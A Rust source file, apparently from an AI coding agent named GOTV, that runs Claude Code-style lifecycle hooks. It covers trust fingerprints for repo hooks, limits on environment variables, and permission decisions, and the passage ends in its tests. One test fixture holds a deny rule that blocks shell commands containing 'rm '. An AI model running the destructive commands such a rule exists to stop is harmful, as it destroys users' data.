//! Hooks (X3 · F10.1), en el formato de Claude Code para que un mismo proyecto sirva a ambos:
//!
//! ```json
//! {"hooks": {"PreToolUse":  [{"matcher": "Bash|Write", "hooks": [{"type": "command", "command": "…", "timeout": 30}]}],
//!            "SessionStart": [{"matcher": "startup", "hooks": [{"type": "http", "url": "http://127.0.0.1:9/h"}]}],
//!            "Stop": [{"hooks": [{"type": "prompt", "prompt": "¿Terminó de verdad? $ARGUMENTS"}]}]}}
//! ```
//!
//! **Eventos (13):** `PreToolUse`, `PostToolUse`, `Stop` (X3) y, desde F10.1, `SessionStart`, `SessionEnd`,
//! `UserPromptSubmit`, `PermissionRequest`, `PreCompact`, `PostCompact`, `SubagentStart`, `SubagentStop`,
//! `FileChanged` y `Notification`. Cada uno se dispara en UN punto del agente (`hooks_eventos.rs`).
//!
//! **Entrada:** un JSON con los campos comunes (`session_id`, `cwd`, `permission_mode`,
//! `hook_event_name`) y los del evento (`tool_name`, `prompt`, `source`, `trigger`, `file_path`…), con los
//! mismos nombres que Claude Code. Al comando le llega por stdin (y `CLAUDE_PROJECT_DIR`/`GOTV_PROJECT_DIR`
//! en el entorno); a un hook `http`, como cuerpo de un POST; a uno `prompt`, en `$ARGUMENTS`.
//!
//! **Tipos:** `command` (bash), `http` (POST con `reqwest`; las cabeceras sólo expanden las variables de
//! `allowedEnvVars`) y `prompt` (una consulta corta al modelo de la sesión que responde
//! `{"ok": true|false, "reason": …}`). `agent` y `mcp_tool` de Claude Code no existen aquí: se avisan.
//!
//! **Salida:** salida 2 (o `{"decision":"block","reason":…}`) BLOQUEA en los eventos que pueden bloquear
//! (`PreToolUse`, `PostToolUse` —la razón va al modelo—, `UserPromptSubmit`, `Stop`, `SubagentStop`,
//! `PreCompact`); en los demás es un aviso. `hookSpecificOutput.additionalContext` (o el texto suelto en
//! `SessionStart`/`UserPromptSubmit`) suma contexto; en `PreCompact` el texto son instrucciones para el
//! resumen; en `PermissionRequest`, `hookSpecificOutput.decision.behavior` = `allow`/`deny`. Otra salida
//! ≠ 0 = aviso que no bloquea. Ningún hook ABRE una puerta que la ventana no abriría: lo irreversible y lo
//! que toca el sistema lo sigue contestando una persona (ver `hooks_eventos.rs`).
//!
//! **Registro:** cada corrida queda en `.gotv/registros/hooks.log` del proyecto (evento, tipo, destino,
//! resultado y milisegundos; nunca la entrada ni las cabeceras) y en la transcripción.
//!
//! De dónde: `~/.config/gotv/hooks.json` (del usuario: confiables), los de los plugins confiados (F10.4) y,
//! del proyecto, `.gotv/hooks.json` y los `hooks` de `.claude/settings.json`. Los del PROYECTO son
//! comandos que trae el repo: un repo clonado no puede ejecutar nada en esta Mac sin que el usuario confíe
//! UNA vez en ese contenido exacto (se guarda su sha256; si cambia, se vuelve a preguntar).
//! `~/.claude/settings.json` NO se carga: sus hooks son de Claude Code.

use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Event {
    PreToolUse,
    PostToolUse,
    Stop,
    SessionStart,
    SessionEnd,
    UserPromptSubmit,
    PermissionRequest,
    PreCompact,
    PostCompact,
    SubagentStart,
    SubagentStop,
    FileChanged,
    Notification,
}

impl Event {
    pub const TODOS: [Event; 13] = [
        Event::PreToolUse,
        Event::PostToolUse,
        Event::Stop,
        Event::SessionStart,
        Event::SessionEnd,
        Event::UserPromptSubmit,
        Event::PermissionRequest,
        Event::PreCompact,
        Event::PostCompact,
        Event::SubagentStart,
        Event::SubagentStop,
        Event::FileChanged,
        Event::Notification,
    ];

    /// El nombre del evento en el archivo (el de Claude Code).
    pub fn key(self) -> &'static str {
        match self {
            Event::PreToolUse => "PreToolUse",
            Event::PostToolUse => "PostToolUse",
            Event::Stop => "Stop",
            Event::SessionStart => "SessionStart",
            Event::SessionEnd => "SessionEnd",
            Event::UserPromptSubmit => "UserPromptSubmit",
            Event::PermissionRequest => "PermissionRequest",
            Event::PreCompact => "PreCompact",
            Event::PostCompact => "PostCompact",
            Event::SubagentStart => "SubagentStart",
            Event::SubagentStop => "SubagentStop",
            Event::FileChanged => "FileChanged",
            Event::Notification => "Notification",
        }
    }

    /// ¿Una salida 2 o un `"decision": "block"` lo detiene?
    pub fn bloqueable(self) -> bool {
        matches!(self, Event::PreToolUse | Event::PostToolUse | Event::Stop | Event::UserPromptSubmit | Event::SubagentStop | Event::PreCompact)
    }

    /// ¿Mira su `matcher`? (`UserPromptSubmit` y `Stop` no lo tienen en Claude Code)
    fn con_matcher(self) -> bool {
        !matches!(self, Event::UserPromptSubmit | Event::Stop)
    }

    fn de_herramienta(self) -> bool {
        matches!(self, Event::PreToolUse | Event::PostToolUse | Event::PermissionRequest)
    }
}

/// Qué hace un hook.
#[derive(Debug, Clone, PartialEq)]
pub enum Accion {
    /// Un comando de bash (recibe la entrada por stdin).
    Command(String),
    /// Un POST con la entrada como cuerpo. Las cabeceras expanden `$VAR`/`${VAR}` sólo si la variable está
    /// en `allowed_env` (las demás quedan vacías: un hook no se lleva el entorno entero).
    Http { url: String, headers: Vec<(String, String)>, allowed_env: Vec<String> },
    /// Una consulta corta al modelo de la sesión; `$ARGUMENTS` = la entrada en JSON.
    Prompt(String),
}

impl Accion {
    fn tipo(&self) -> &'static str {
        match self {
            Accion::Command(_) => "command",
            Accion::Http { .. } => "http",
            Accion::Prompt(_) => "prompt",
        }
    }

    /// A dónde va (para la confianza y el registro): el comando, la URL o el principio del prompt.
    pub fn destino(&self) -> String {
        match self {
            Accion::Command(c) => c.clone(),
            Accion::Http { url, .. } => url.clone(),
            Accion::Prompt(p) => p.chars().take(80).collect(),
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct Hook {
    pub event: Event,
    pub matcher: String,
    pub accion: Accion,
    pub timeout: u64,
    /// ¿Viene del proyecto (requiere confianza) o del usuario/un plugin confiado?
    pub project: bool,
    /// F10.4: la carpeta del plugin que lo trae (`CLAUDE_PLUGIN_ROOT`).
    pub plugin: Option<PathBuf>,
}

#[derive(Debug, Clone, Default)]
pub struct Hooks {
    pub list: Vec<Hook>,
    /// Lo que no se pudo cargar (tipos que GOTV no tiene, eventos desconocidos), para decirlo una vez.
    pub avisos: Vec<String>,
}

/// Nombre de Claude Code ↔ nombre de GOTV, para que sus `matcher` sirvan aquí.
pub(crate) fn alias(tool: &str) -> &'static str {
    match tool {
        "bash" => "Bash",
        "write_file" => "Write",
        "edit" => "Edit",
        "multi_edit" => "MultiEdit",
        "read_file" => "Read",
        "glob" => "Glob",
        "grep" => "Grep",
        "web_fetch" => "WebFetch",
        "web_search" => "WebSearch",
        "todo" => "TodoWrite",
        "list_dir" => "LS",
        "task" => "Task",
        _ => "",
    }
}

/// `""`, `*` o `.*` = todas; si no, alternativas `A|B|C` (nombre de GOTV o de Claude Code) o una
/// expresión regular (sin anclar), como en Claude Code. Para herramientas.
pub fn matches(matcher: &str, tool: &str) -> bool {
    casa(Event::PreToolUse, matcher, tool)
}

/// ¿Este `matcher` casa con `objetivo` en el evento `ev`? Las reglas de Claude Code: sólo letras, dígitos,
/// `_`, `-`, espacio, `,` y `|` = nombre exacto o lista; cualquier otro carácter = expresión regular sin
/// anclar. `FileChanged` sólo admite la lista de nombres de archivo con `|`.
pub fn casa(ev: Event, matcher: &str, objetivo: &str) -> bool {
    if !ev.con_matcher() {
        return true;
    }
    let m = matcher.trim();
    if m.is_empty() || m == "*" {
        return true;
    }
    let a = if ev.de_herramienta() { alias(objetivo) } else { "" };
    let igual = |p: &str| p == objetivo || (!a.is_empty() && p == a);
    if ev == Event::FileChanged {
        return m.split('|').map(str::trim).any(igual);
    }
    if m.chars().all(|c| c.is_alphanumeric() || "_- ,|".contains(c)) {
        return m.split(['|', ',']).map(str::trim).filter(|p| !p.is_empty()).any(igual);
    }
    match regex::Regex::new(m) {
        Ok(r) => r.is_match(objetivo) || (!a.is_empty() && r.is_match(a)),
        Err(_) => false,
    }
}

/// Lee los hooks de un valor `{"hooks": {...}}` (o el mapa de eventos suelto, como en algunos
/// `hooks/hooks.json` de plugins). `${CLAUDE_PLUGIN_ROOT}` se resuelve con la carpeta del plugin.
pub fn parse_en(v: &Value, project: bool, plugin: Option<&Path>, out: &mut Hooks) {
    let mapa = if v.get("hooks").is_some_and(Value::is_object) { &v["hooks"] } else { v };
    let Some(obj) = mapa.as_object() else { return };
    let raiz_plugin = |s: &str| match plugin {
        Some(p) => s.replace("${CLAUDE_PLUGIN_ROOT}", &p.to_string_lossy()).replace("${GOTV_PLUGIN_ROOT}", &p.to_string_lossy()),
        None => s.to_string(),
    };
    for (clave, grupos) in obj {
        let Some(ev) = Event::TODOS.iter().copied().find(|e| e.key() == clave) else {
            // `hooks` también puede traer otras claves de `.claude/settings.json` (`disableAllHooks`…)
            if grupos.is_array() {
                out.avisos.push(crate::tr!("hook de evento «{clave}»: GOTV no tiene ese evento; se ignora", "hook for event «{clave}»: GOTV has no such event; ignored"));
            }
            continue;
        };
        for group in grupos.as_array().into_iter().flatten() {
            let matcher = group["matcher"].as_str().unwrap_or("").to_string();
            for h in group["hooks"].as_array().into_iter().flatten() {
                let tipo = h["type"].as_str().unwrap_or("command");
                let accion = match tipo {
                    "command" => match h["command"].as_str().filter(|c| !c.trim().is_empty()) {
                        Some(c) => Accion::Command(raiz_plugin(c)),
                        None => continue,
                    },
                    "http" => match h["url"].as_str().filter(|u| !u.trim().is_empty()) {
                        Some(u) => Accion::Http {
                            url: raiz_plugin(u),
                            headers: h["headers"].as_object().into_iter().flatten().filter_map(|(k, v)| Some((k.clone(), v.as_str()?.to_string()))).collect(),
                            allowed_env: h["allowedEnvVars"].as_array().into_iter().flatten().filter_map(|x| x.as_str().map(String::from)).collect(),
                        },
                        None => continue,
                    },
                    "prompt" => match h["prompt"].as_str().filter(|p| !p.trim().is_empty()) {
                        Some(p) => Accion::Prompt(raiz_plugin(p)),
                        None => continue,
                    },
                    otro => {
                        out.avisos.push(crate::tr!("hook de tipo «{otro}» en {clave}: GOTV sólo corre command, http y prompt; se ignora", "hook of type «{otro}» in {clave}: GOTV only runs command, http and prompt; ignored"));
                        continue;
                    }
                };
                // por omisión: 60 s (30 s un prompt, como en Claude Code); nunca más de 10 minutos
                let defecto = if tipo == "prompt" { 30 } else { 60 };
                out.list.push(Hook { event: ev, matcher: matcher.clone(), accion, timeout: h["timeout"].as_u64().unwrap_or(defecto).clamp(1, 600), project, plugin: plugin.map(Path::to_path_buf) });
            }
        }
    }
}

pub fn user_file() -> PathBuf {
    PathBuf::from(std::env::var("HOME").unwrap_or_default()).join(".config/gotv/hooks.json")
}

pub fn project_files(root: &Path) -> Vec<PathBuf> {
    vec![root.join(".gotv/hooks.json"), root.join(".claude/settings.json")]
}

fn read(p: &Path) -> Option<(Value, String)> {
    let text = std::fs::read_to_string(p).ok()?;
    Some((serde_json::from_str(&text).ok()?, text))
}

/// La huella de una lista de hooks (lo que se confía: evento, matcher, tipo, destino y tiempo).
pub fn huella(hooks: &[Hook]) -> String {
    let mut h = Sha256::new();
    for x in hooks {
        let extra = match &x.accion {
            Accion::Http { headers, allowed_env, .. } => format!("{:?}|{:?}", headers, allowed_env),
            Accion::Prompt(p) => p.clone(),
            Accion::Command(_) => String::new(),
        };
        h.update(format!("{:?}|{}|{}|{}|{}|{}\n", x.event, x.matcher, x.accion.tipo(), x.accion.destino(), x.timeout, extra));
    }
    format!("{:x}", h.finalize())
}

/// Carga todo. Devuelve también la huella de los hooks del PROYECTO (para la confianza).
pub fn load(root: &Path) -> (Hooks, Option<String>) {
    let mut todos = Hooks::default();
    if let Some((v, _)) = read(&user_file()) {
        parse_en(&v, false, None, &mut todos);
    }
    // F10.4: los hooks de los plugins instalados y CONFIADOS (un plugin sin confianza no carga nada)
    for (dir, v) in crate::plugins::hooks_de_plugins() {
        parse_en(&v, false, Some(&dir), &mut todos);
    }
    let mut proj = Hooks::default();
    for f in project_files(root) {
        if let Some((v, _)) = read(&f) {
            parse_en(&v, true, None, &mut proj);
        }
    }
    let fp = (!proj.list.is_empty()).then(|| huella(&proj.list));
    todos.list.extend(proj.list);
    todos.avisos.extend(proj.avisos);
    (todos, fp)
}

/// Formato propio (TRHK, mapa carpeta → huella); hasta 2026-11-17 era `trusted-hooks.json` (se migra solo).
fn trust_file() -> PathBuf {
    gotv_engine::cache_dir().join("trusted-hooks.gotv")
}

fn confiados(file: &Path) -> std::collections::BTreeMap<String, String> {
    crate::programar::codec::mapa_migrado(file, &file.with_extension("json"), b"TRHK")
}

pub fn is_trusted(root: &Path, fp: &str) -> bool {
    is_trusted_in(&trust_file(), root, fp)
}

pub fn trust(root: &Path, fp: &str) {
    trust_in(&trust_file(), root, fp)
}

fn is_trusted_in(file: &Path, root: &Path, fp: &str) -> bool {
    confiados(file).get(root.to_string_lossy().as_ref()).map(String::as_str) == Some(fp)
}

fn trust_in(file: &Path, root: &Path, fp: &str) {
    let mut m = confiados(file);
    m.insert(root.to_string_lossy().into_owned(), fp.to_string());
    let _ = crate::programar::codec::guardar_mapa(file, b"TRHK", &m);
}

/// Los campos que lleva toda entrada (los de Claude Code que GOTV tiene).
#[derive(Debug, Clone, Default)]
pub struct Comunes {
    pub session_id: String,
    pub cwd: PathBuf,
    /// `default`, `plan`, `acceptEdits`, `auto` o `bypassPermissions`
    pub permission_mode: String,
}

/// Un disparo: el evento, contra qué casa el `matcher` (herramienta, `source`, `trigger`, tipo de aviso,
/// nombre del archivo…) y los campos propios del evento.
#[derive(Debug, Clone)]
pub struct Entrada {
    pub evento: Event,
    pub objetivo: String,
    pub campos: Value,
}

/// Lo que decidió un hook `PermissionRequest`.
#[derive(Debug, Clone, PartialEq)]
pub enum Permiso {
    Permitir,
    Negar(String),
}

/// Lo que dejaron los hooks de un disparo.
#[derive(Debug, Clone, Default)]
pub struct Salida {
    /// la razón del primero que bloqueó (sólo en eventos que pueden bloquear)
    pub bloqueo: Option<String>,
    pub avisos: Vec<String>,
    /// contexto para el modelo (`additionalContext` o el texto suelto de SessionStart/UserPromptSubmit)
    pub contexto: Vec<String>,
    /// PreCompact: instrucciones para el resumen
    pub instrucciones: Vec<String>,
    /// PermissionRequest: «negar» gana a «permitir»
    pub permiso: Option<Permiso>,
    /// una línea por hook que corrió (lo que queda en el registro)
    pub corridas: Vec<String>,
}

/// La consulta de un hook `prompt` (el agente la contesta con su motor).
#[async_trait::async_trait]
pub trait Juez: Send + Sync {
    async fn preguntar(&self, prompt: &str, tope: Duration) -> Option<String>;
}

impl Hooks {
    /// Quita los del proyecto (sin confianza).
    pub fn without_project(mut self) -> Self {
        self.list.retain(|h| !h.project);
        self
    }

    pub fn project_commands(&self) -> Vec<String> {
        self.list
            .iter()
            .filter(|h| h.project)
            .map(|h| {
                let tipo = match &h.accion {
                    Accion::Command(_) => String::new(),
                    otra => format!("{}: ", otra.tipo()),
                };
                format!("{} [{}] {tipo}{}", h.event.key(), if h.matcher.is_empty() { "*" } else { &h.matcher }, h.accion.destino())
            })
            .collect()
    }

    pub fn is_empty(&self) -> bool {
        self.list.is_empty()
    }

    /// ¿Hay alguno para este evento? (para no armar la entrada en balde)
    pub fn tiene(&self, ev: Event) -> bool {
        self.list.iter().any(|h| h.event == ev)
    }

    /// Corre los hooks del evento que casan con `tool` (X3: `PreToolUse`, `PostToolUse`, `Stop`).
    /// `Some(razón)` si alguno BLOQUEA; los avisos se devuelven aparte para mostrarlos.
    pub async fn run(&self, ev: Event, tool: &str, input: &Value, response: Option<&str>, root: &Path) -> (Option<String>, Vec<String>) {
        let campos = match ev {
            Event::Stop => json!({"stop_hook_active": false, "last_assistant_message": response}),
            _ => json!({
                "tool_name": if alias(tool).is_empty() { tool } else { alias(tool) },
                "gotv_tool_name": tool,
                "tool_input": input,
                "tool_response": response,
            }),
        };
        let comunes = Comunes { cwd: root.to_path_buf(), ..Default::default() };
        let s = self.disparar(&Entrada { evento: ev, objetivo: tool.to_string(), campos }, &comunes, None).await;
        (s.bloqueo, s.avisos)
    }

    /// Corre los hooks de un disparo, en orden. El primero que bloquea corta (los siguientes no corren).
    pub async fn disparar(&self, e: &Entrada, comunes: &Comunes, juez: Option<&dyn Juez>) -> Salida {
        let mut s = Salida::default();
        let elegidos: Vec<&Hook> = self.list.iter().filter(|h| h.event == e.evento && casa(e.evento, &h.matcher, &e.objetivo)).collect();
        if elegidos.is_empty() {
            return s;
        }
        let mut payload = json!({
            "session_id": comunes.session_id,
            "cwd": comunes.cwd,
            "permission_mode": comunes.permission_mode,
            "hook_event_name": e.evento.key(),
        });
        if let (Some(p), Some(c)) = (payload.as_object_mut(), e.campos.as_object()) {
            for (k, v) in c {
                p.insert(k.clone(), v.clone());
            }
        }
        let ev = e.evento;
        for h in elegidos {
            let t0 = Instant::now();
            let resultado = match &h.accion {
                Accion::Command(cmd) => match run_one(cmd, &payload, &comunes.cwd, h.timeout, h.plugin.as_deref()).await {
                    Ok((code, out, err)) => {
                        interpretar_comando(ev, code, &out, &err, &h.accion.destino(), &mut s);
                        crate::tr!("salida {code}", "exit {code}")
                    }
                    Err(err) => {
                        s.avisos.push(crate::tr!("hook «{}» falló: {err}", "hook «{}» failed: {err}", h.accion.destino()));
                        crate::tr!("falló: {err}", "failed: {err}")
                    }
                },
                Accion::Http { url, headers, allowed_env } => match run_http(url, headers, allowed_env, &payload, h.timeout).await {
                    Ok((code, cuerpo)) => {
                        interpretar_http(ev, code, &cuerpo, url, &mut s);
                        format!("HTTP {code}")
                    }
                    Err(err) => {
                        s.avisos.push(crate::tr!("hook http «{url}» falló: {err}", "http hook «{url}» failed: {err}"));
                        crate::tr!("falló: {err}", "failed: {err}")
                    }
                },
                Accion::Prompt(p) => {
                    let texto = if p.contains("$ARGUMENTS") { p.replace("$ARGUMENTS", &payload.to_string()) } else { format!("{p}\n\n{payload}") };
                    match juez {
                        None => {
                            s.avisos.push(crate::tr!("hook prompt en {}: no hay modelo que lo conteste aquí; se salta", "prompt hook on {}: there is no model to answer it here; skipped", ev.key()));
                            crate::i18n::t("sin modelo", "no model").to_string()
                        }
                        Some(j) => match j.preguntar(&texto, Duration::from_secs(h.timeout)).await {
                            Some(r) => interpretar_prompt(ev, &r, &mut s),
                            None => {
                                s.avisos.push(crate::tr!("hook prompt en {}: el modelo no respondió", "prompt hook on {}: the model did not answer", ev.key()));
                                crate::i18n::t("sin respuesta", "no answer").to_string()
                            }
                        },
                    }
                }
            };
            let linea = format!("{} [{}] {} → {resultado} ({} ms)", ev.key(), h.accion.tipo(), corto(&h.accion.destino()), t0.elapsed().as_millis());
            anotar(&comunes.cwd, &linea);
            s.corridas.push(linea);
            if s.bloqueo.is_some() {
                break;
            }
        }
        s
    }
}

fn corto(s: &str) -> String {
    let l = s.lines().next().unwrap_or("");
    if l.chars().count() > 100 {
        format!("{}…", l.chars().take(100).collect::<String>())
    } else {
        l.to_string()
    }
}

/// Una línea al registro del proyecto (`.gotv/registros/hooks.log`), con la hora en segundos UNIX.
fn anotar(root: &Path, linea: &str) {
    use std::io::Write;
    if root.as_os_str().is_empty() {
        return;
    }
    let d = root.join(".gotv/registros");
    let _ = std::fs::create_dir_all(&d);
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(d.join("hooks.log")) {
        let t = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
        let _ = writeln!(f, "{t} {linea}");
    }
}

/// La razón de un bloqueo (o una por defecto que nombra al hook).
fn non_empty(reason: &str, quien: &str) -> String {
    let r = reason.trim();
    if r.is_empty() {
        crate::tr!("bloqueado por el hook «{quien}»", "blocked by the hook «{quien}»")
    } else {
        r.chars().take(2000).collect()
    }
}

/// Un objeto JSON de salida, con las reglas de Claude Code.
fn aplicar_json(ev: Event, v: &Value, quien: &str, s: &mut Salida) {
    let hso = &v["hookSpecificOutput"];
    if let Some(c) = hso["additionalContext"].as_str().filter(|c| !c.trim().is_empty()) {
        s.contexto.push(c.to_string());
    }
    if ev.bloqueable() && v["decision"].as_str() == Some("block") {
        s.bloqueo = Some(non_empty(v["reason"].as_str().unwrap_or(""), quien));
        return;
    }
    // PreToolUse moderno: `permissionDecision`. «deny» bloquea; «allow» y «ask» NO saltan los permisos de
    // GOTV (ya pasaron por su puerta): un hook no abre lo que la ventana no abriría
    if ev == Event::PreToolUse && hso["permissionDecision"].as_str() == Some("deny") {
        s.bloqueo = Some(non_empty(hso["permissionDecisionReason"].as_str().unwrap_or(""), quien));
        return;
    }
    if ev == Event::PermissionRequest {
        match hso["decision"]["behavior"].as_str() {
            Some("deny") => {
                let m = hso["decision"]["message"].as_str().unwrap_or("");
                s.permiso = Some(Permiso::Negar(non_empty(m, quien)));
            }
            Some("allow") if s.permiso.is_none() => s.permiso = Some(Permiso::Permitir),
            _ => {}
        }
    }
}

fn interpretar_comando(ev: Event, code: i32, out: &str, err: &str, quien: &str, s: &mut Salida) {
    match code {
        0 => {
            let t = out.trim();
            match serde_json::from_str::<Value>(t) {
                Ok(v) if v.is_object() => aplicar_json(ev, &v, quien, s),
                _ if t.is_empty() => {}
                _ => match ev {
                    Event::SessionStart | Event::UserPromptSubmit => s.contexto.push(t.to_string()),
                    Event::PreCompact => s.instrucciones.push(t.to_string()),
                    _ => {}
                },
            }
        }
        2 if ev.bloqueable() => s.bloqueo = Some(non_empty(err, quien)),
        // en PermissionRequest la salida 2 no decide (como en Claude Code): sólo el JSON
        _ => s.avisos.push(crate::tr!("hook «{quien}» salió con {code}: {}", "hook «{quien}» exited with {code}: {}", err.trim())),
    }
}

fn interpretar_http(ev: Event, code: u16, cuerpo: &str, url: &str, s: &mut Salida) {
    if !(200..300).contains(&code) {
        s.avisos.push(crate::tr!("hook http «{url}» respondió {code}", "http hook «{url}» answered {code}"));
        return;
    }
    let t = cuerpo.trim();
    if t.is_empty() {
        return;
    }
    match serde_json::from_str::<Value>(t) {
        Ok(v) if v.is_object() => aplicar_json(ev, &v, url, s),
        _ => s.avisos.push(crate::tr!("hook http «{url}»: la respuesta no es un objeto JSON; se ignora", "http hook «{url}»: the answer is not a JSON object; ignored")),
    }
}

/// `{"ok": true|false, "reason": …}` (el primer objeto de la respuesta; el modelo puede envolverlo).
fn interpretar_prompt(ev: Event, r: &str, s: &mut Salida) -> String {
    let v = r.find('{').and_then(|i| r.rfind('}').map(|j| (i, j))).and_then(|(i, j)| serde_json::from_str::<Value>(&r[i..=j]).ok());
    let Some(v) = v.filter(|v| v["ok"].is_boolean()) else {
        s.avisos.push(crate::tr!("hook prompt en {}: la respuesta no trae {{\"ok\": …}}; se ignora", "prompt hook on {}: the answer has no {{\"ok\": …}}; ignored", ev.key()));
        return crate::i18n::t("respuesta ilegible", "unreadable answer").into();
    };
    if v["ok"].as_bool() == Some(true) {
        return "ok".into();
    }
    let razon = non_empty(v["reason"].as_str().unwrap_or(""), "prompt");
    if ev.bloqueable() {
        s.bloqueo = Some(razon.clone());
    } else if ev == Event::PermissionRequest {
        // un modelo puede NEGAR un permiso, nunca concederlo
        s.permiso = Some(Permiso::Negar(razon.clone()));
    } else {
        s.avisos.push(razon.clone());
    }
    format!("ok=false: {}", corto(&razon))
}

async fn run_one(cmd: &str, payload: &Value, root: &Path, timeout: u64, plugin: Option<&Path>) -> anyhow::Result<(i32, String, String)> {
    use tokio::io::AsyncWriteExt;
    let mut c = tokio::process::Command::new("bash");
    c.arg("-c")
        .arg(cmd)
        .env("CLAUDE_PROJECT_DIR", root)
        .env("GOTV_PROJECT_DIR", root)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true);
    if root.is_dir() {
        c.current_dir(root);
    }
    if let Some(p) = plugin {
        c.env("CLAUDE_PLUGIN_ROOT", p).env("GOTV_PLUGIN_ROOT", p);
    }
    let mut child = c.spawn()?;
    if let Some(mut stdin) = child.stdin.take() {
        let _ = stdin.write_all(payload.to_string().as_bytes()).await;
    }
    let out = tokio::time::timeout(Duration::from_secs(timeout), child.wait_with_output())
        .await
        .map_err(|_| anyhow::anyhow!("{}", crate::tr!("pasó su tiempo ({timeout} s)", "timed out ({timeout} s)")))??;
    let cut = |b: &[u8]| String::from_utf8_lossy(b).chars().take(4000).collect::<String>();
    Ok((out.status.code().unwrap_or(-1), cut(&out.stdout), cut(&out.stderr)))
}

/// `$VAR` y `${VAR}` de las cabeceras: sólo las permitidas; las demás, vacías.
pub fn expandir_cabecera(v: &str, permitidas: &[String]) -> String {
    let mut out = String::with_capacity(v.len());
    let b: Vec<char> = v.chars().collect();
    let mut i = 0;
    while i < b.len() {
        if b[i] == '$' && i + 1 < b.len() {
            let (nombre, fin) = if b[i + 1] == '{' {
                match b[i + 2..].iter().position(|c| *c == '}') {
                    Some(p) => (b[i + 2..i + 2 + p].iter().collect::<String>(), i + 3 + p),
                    None => {
                        out.push(b[i]);
                        i += 1;
                        continue;
                    }
                }
            } else {
                let n: String = b[i + 1..].iter().take_while(|c| c.is_ascii_alphanumeric() || **c == '_').collect();
                let l = n.chars().count();
                (n, i + 1 + l)
            };
            if nombre.is_empty() {
                out.push('$');
                i += 1;
                continue;
            }
            if permitidas.iter().any(|p| *p == nombre) {
                out.push_str(&std::env::var(&nombre).unwrap_or_default());
            }
            i = fin;
        } else {
            out.push(b[i]);
            i += 1;
        }
    }
    out
}

async fn run_http(url: &str, headers: &[(String, String)], permitidas: &[String], payload: &Value, timeout: u64) -> anyhow::Result<(u16, String)> {
    let cliente = reqwest::Client::builder().timeout(Duration::from_secs(timeout)).build()?;
    let mut req = cliente.post(url).header("Content-Type", "application/json").body(payload.to_string());
    for (k, v) in headers {
        req = req.header(k.as_str(), expandir_cabecera(v, permitidas));
    }
    let r = req.send().await?;
    let code = r.status().as_u16();
    let cuerpo = r.text().await.unwrap_or_default();
    Ok((code, cuerpo.chars().take(20_000).collect()))
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    fn tmp(tag: &str) -> crate::CarpetaPrueba {
        let d = crate::CarpetaPrueba::sin_crear(&format!("gotv-hooks-{tag}"));
        std::fs::create_dir_all(d.join(".gotv")).unwrap();
        d
    }

    /// Un hook de prueba ESCRITO EN RUST: el propio binario de pruebas, que con `GOTV_HOOK_FALSO` vuelca la
    /// entrada (stdin) a un archivo, imprime lo que se le pida y sale con un código. Formato:
    /// `ruta|código|salida` (la salida puede llevar `|`).
    pub(crate) fn hook_falso(volcado: &Path, codigo: i32, salida: &str) -> String {
        let spec = format!("{}|{codigo}|{salida}", volcado.display());
        assert!(!spec.contains('\''));
        // el arnés de pruebas escribe «running 1 test» en stdout: el programa dice lo suyo por stderr y aquí se
        // pasa a stdout (salvo con salida 2, que va a stderr como en un hook de verdad)
        let redireccion = if codigo == 2 { ">/dev/null" } else { "2>&1 >/dev/null" };
        format!("GOTV_HOOK_FALSO='{spec}' '{}' --exact hooks::tests::programa_hook_falso --nocapture --quiet {redireccion}", std::env::current_exe().unwrap().display())
    }

    #[test]
    fn programa_hook_falso() {
        use std::io::{Read, Write};
        let Ok(spec) = std::env::var("GOTV_HOOK_FALSO") else { return };
        let mut it = spec.splitn(3, '|');
        let (ruta, codigo, salida) = (it.next().unwrap(), it.next().unwrap().parse::<i32>().unwrap(), it.next().unwrap_or(""));
        let mut entrada = String::new();
        std::io::stdin().read_to_string(&mut entrada).unwrap();
        let mut f = std::fs::OpenOptions::new().create(true).append(true).open(ruta).unwrap();
        writeln!(f, "{entrada}").unwrap();
        eprint!("{salida}");
        let _ = std::io::stderr().flush();
        std::process::exit(codigo);
    }

    /// Las entradas volcadas (una por línea, JSON).
    pub(crate) fn volcadas(p: &Path) -> Vec<Value> {
        std::fs::read_to_string(p).unwrap_or_default().lines().filter(|l| !l.trim().is_empty()).map(|l| serde_json::from_str(l).unwrap()).collect()
    }

    #[test]
    fn matcher_de_claude_code() {
        assert!(matches("Write|Edit|MultiEdit|NotebookEdit|Bash", "bash"));
        assert!(matches("Write|Edit", "write_file"));
        assert!(!matches("Bash", "write_file"));
        assert!(matches("", "read_file") && matches("*", "x") && matches(".*", "x"));
        assert!(matches("web_fetch", "web_fetch"));
        // F10.1: listas con coma, expresiones regulares (sin anclar) y nombres de MCP
        assert!(matches("Read, Grep", "grep"));
        assert!(matches("mcp__memoria__.*", "mcp__memoria__guardar") && !matches("mcp__memoria__.*", "mcp__otro__x"));
        assert!(matches("^Bash$", "bash"), "la regex también casa con el alias de Claude Code");
        // los demás eventos casan con su objetivo; UserPromptSubmit y Stop no miran el matcher
        assert!(casa(Event::SessionStart, "startup", "startup") && !casa(Event::SessionStart, "resume", "startup"));
        assert!(casa(Event::FileChanged, ".envrc|.env", ".env") && !casa(Event::FileChanged, ".envrc|.env", "env"));
        assert!(casa(Event::UserPromptSubmit, "lo que sea", "x") && casa(Event::Stop, "nada", ""));
        assert!(casa(Event::Notification, "permission_prompt", "permission_prompt"));
    }

    #[tokio::test]
    async fn bloquea_avisa_y_deja_pasar() {
        let d = tmp("run");
        std::fs::write(
            d.join(".gotv/hooks.json"),
            r#"{"hooks": {
                "PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "grep -q 'rm ' && { echo 'prohibido borrar aquí' >&2; exit 2; } || exit 0"}]}],
                "PostToolUse": [{"matcher": "Write", "hooks": [{"type": "command", "command": "echo '{\"decision\":\"block\",\"reason\":\"formatea con prettier\"}'"}]}],
                "Stop": [{"hooks": [{"type": "command", "command": "exit 1"}]}]
            }}"#,
        )
        .unwrap();
        let (h, fp) = load(&d);
        let h = Hooks { list: h.list.into_iter().filter(|x| x.project).collect(), avisos: vec![] };
        assert_eq!(h.list.len(), 3);
        assert!(fp.is_some());
